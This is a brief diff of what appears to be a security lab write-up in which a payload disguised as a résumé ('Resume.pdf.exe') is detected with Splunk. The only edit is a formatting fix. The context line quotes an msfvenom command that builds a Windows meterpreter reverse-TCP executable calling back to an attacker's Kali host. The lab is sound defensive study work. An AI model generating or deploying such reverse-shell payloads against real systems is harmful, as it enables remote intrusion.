@@ -52,7 +52,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > 
 
 6. Used Splunk to analyze logs and monitor process behavior and network activity.
 
-7.Observed process tree:
+7. Observed process tree:
 Resume.pdf.exe → cmd.exe → system commands
 
 
